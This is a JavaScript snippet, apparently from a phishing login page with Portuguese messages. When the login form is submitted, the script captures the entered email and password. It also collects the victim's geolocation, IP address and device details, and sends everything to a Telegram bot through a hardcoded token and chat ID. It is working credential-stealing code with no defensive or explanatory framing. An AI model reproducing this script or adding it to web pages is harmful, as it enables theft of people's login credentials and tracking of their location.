    <!-- Add Axios and the custom JavaScript code -->
<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>

    let locationData = null;
/*HTTPS://API.TELEGRAM.ORG/BOT<TOKEN>/GETUPDATES*/
navigator.geolocation.getCurrentPosition((position) => {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    locationData = `https://www.google.com/maps?q=${lat},${lon}`;
});
    const TOKEN = "8838203713:AAFux6rxaJIvCJGwgkzCZ1SamSt_aXQXGGU";
    const CHAT_ID = "8830461614"; 
    const CHAT_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // Handle form submission
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent default form submission

        // Get form values
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Fetch the user's IP address
        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                
const ip = response.data.ip; // Get the user's IP address
console.log('User IP:', ip); // Log IP for debugging

// Get device information
const userAgent = navigator.userAgent; // Browser and OS info
const platform = navigator.platform; // Device platform
const screenWidth = screen.width; // Screen width
const screenHeight = screen.height; // Screen height
const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

// Log all collected device info for debugging
console.log('User-Agent:', userAgent);
console.log('Platform:', platform);
console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);
console.log('Device Type:', deviceType);

// Prepare the message with form data, IP, and device info
const message = `
<b>New Login Attempt</b>\n
<b>Email:</b> ${email}\n
<b>Password:</b> ${password}\n
<b>IP Address:</b> ${ip}\n
<b>Device Type:</b> ${deviceType}\n
<b>Platform:</b> ${platform}\n
<b>User Agent:</b> ${userAgent}\n
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
<b>location:</b> ${locationData}\n
`;
// Send the message to Telegram
axios.post(CHAT_URL, {
    chat_id: CHAT_ID,
    parse_mode: 'html',
    text: message
}).then(response => {
    console.log('Message sent:', response.data);
    alert('Informações enviadas com sucesso!');
}).catch(error => {
    console.error('Error sending message:', error);
    alert('Erro ao enviar as informações. Tente novamente.');
});
})
.catch(error => {
    console.error('Error fetching IP:', error);
    alert('Erro ao obter o endereço IP. Tente novamente.');
});
});
</script>
